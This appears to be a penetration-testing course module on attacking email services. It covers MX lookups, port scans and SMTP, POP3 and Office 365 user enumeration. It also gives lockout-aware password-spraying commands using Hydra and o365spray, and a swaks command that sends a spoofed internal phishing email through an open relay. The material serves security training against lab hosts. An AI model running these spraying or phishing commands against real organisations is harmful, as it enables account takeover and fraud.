# Attacking Email Services

Email services present a broad attack surface because they involve multiple protocols, multiple ports, and increasingly a mix of on-premise and cloud-hosted infrastructure. Identifying which system a target uses is the first decision point, as the attack approach differs significantly between a self-hosted Postfix server and Microsoft 365 or G-Suite.

## Identifying the Mail Infrastructure

The MX record in DNS reveals where a domain accepts email. This single lookup tells you which service provider -- or whether the company runs its own mail server:

```bash
# Using host
host -t MX hackthebox.eu
host -t MX microsoft.com

# Using dig (filter out comment lines)
dig mx inlanefreight.com | grep "MX" | grep -v ";"

# Resolve the mail server hostname to an IP
host -t A mail1.inlanefreight.htb
```

Common MX record patterns and what they indicate:

| MX Record Pattern | Service |
|---|---|
| `aspmx.l.google.com` | G-Suite / Google Workspace |
| `mail.protection.outlook.com` | Microsoft 365 |
| `mx.zoho.com` | Zoho Mail |
| Custom hostname matching the target domain | Self-hosted mail server |

Cloud providers have modern authentication mechanisms and dedicated attack tools. Self-hosted implementations are more likely to have misconfigurations that expose the classic protocol-level attack surface.

## Port Enumeration for Custom Mail Servers

When targeting a self-hosted mail server, scan all relevant mail ports:

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

| Port | Service |
|---|---|
| TCP/25 | SMTP unencrypted |
| TCP/110 | POP3 unencrypted |
| TCP/143 | IMAP4 unencrypted |
| TCP/465 | SMTP encrypted |
| TCP/587 | SMTP encrypted with STARTTLS |
| TCP/993 | IMAP4 encrypted |
| TCP/995 | POP3 encrypted |

The Nmap output from port 25 is particularly useful -- SMTP banners often list supported commands including `VRFY`, which directly indicates whether user enumeration is possible.

## User Enumeration via SMTP

SMTP includes three commands that can leak valid usernames when the server has not been hardened to suppress differential responses:

**VRFY** confirms whether a user exists on the server:

```bash
telnet 10.10.110.20 25

VRFY root        # 252 = exists
VRFY new-user    # 550 = does not exist
```

**EXPN** expands a mailing list alias, revealing the real addresses of all members. Distribution lists like `all` or `support-team` can return multiple valid email addresses in a single query:

```bash
EXPN support-team
# Returns individual addresses of all list members
```

**RCPT TO** is the most reliable method and works even when VRFY and EXPN are disabled, because it is part of the normal mail delivery flow. The server accepts or rejects each recipient address:

```bash
MAIL FROM: test@htb.com
RCPT TO: julio    # 550 = unknown
RCPT TO: john     # 250 = valid
```

POP3 also leaks user validity through the `USER` command, returning `+OK` for valid accounts and `-ERR` for invalid ones:

```bash
telnet 10.10.110.20 110

USER julio    # -ERR
USER john     # +OK
```

[smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum) automates all three SMTP methods against a wordlist:

```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

Use `-M VRFY`, `-M EXPN`, or `-M RCPT` depending on what the target server supports. The `-D` flag appends the domain to each username to form valid email addresses when the server requires them.

## Cloud Enumeration

Cloud providers do not expose VRFY or RCPT TO, but their authentication APIs often respond differently to valid versus invalid accounts. [O365spray](https://github.com/0xZDH/o365spray) automates this for Microsoft 365 -- it first validates whether the target domain uses O365, then enumerates valid accounts:

```bash
# Confirm the domain uses O365
python3 o365spray.py --validate --domain msplaintext.xyz

# Enumerate valid usernames
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

Valid accounts are saved to a file for use in subsequent password spraying. Keep in mind that Microsoft and other cloud providers frequently change their authentication endpoints and API behaviour, so cloud-focused tools require regular updates to remain functional. Understanding what the tool is doing -- and being able to adjust the authentication request format if needed -- is more valuable than relying on the tool blindly.

## Password Attacks

Once valid usernames are identified, Hydra can perform password spraying against POP3, IMAP4, or SMTP directly:

```bash
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

The `-f` flag stops Hydra after the first valid credential pair is found, which reduces noise and avoids triggering lockout thresholds.

For O365, use o365spray's spray module with a lockout delay between rounds:

```bash
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

The `--lockout 1` flag introduces a one-minute pause between spray rounds. The `--count 1` flag limits the spray to one password per round, reducing the risk of triggering Azure Smart Lockout. For Gmail or Okta environments, [CredKing](https://github.com/ustayready/CredKing) provides similar functionality. Password spraying against Microsoft 365 remains an active real-world threat -- SecurityScorecard documented a botnet of over 130,000 devices conducting large-scale M365 password spray attacks as recently as early 2025, specifically targeting non-interactive sign-in logs to evade MFA monitoring. [securityaffairs](https://securityaffairs.com/174595/cyber-crime/large-botnet-targets-m365-password-spraying-attacks.html)

## Open Relay Abuse

An SMTP open relay is a server that accepts and forwards email from any source without authentication. This is a configuration failure rather than a vulnerability -- the server is functioning as designed, but the design is dangerously permissive.

Nmap can detect it directly:

```bash
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

A result of `Server is an open relay (14/16 tests)` confirms the misconfiguration. With an open relay available, [swaks](https://www.jetmore.org/john/code/swaks/) can send a fully crafted phishing email that appears to originate from a legitimate internal address:

```bash
swaks --from notifications@inlanefreight.com \
      --to employees@inlanefreight.com \
      --header 'Subject: Company Notification' \
      --body 'Hi All, please complete the following survey. http://mycustomphishinglink.com/' \
      --server 10.10.11.213
```

The email arrives appearing to come from `notifications@inlanefreight.com` -- an address employees are likely to recognise and trust -- while the actual sending infrastructure is the attacker's machine routed through the relay. The open relay masks the true source and gives the phishing message the credibility of the target organisation's own mail domain.
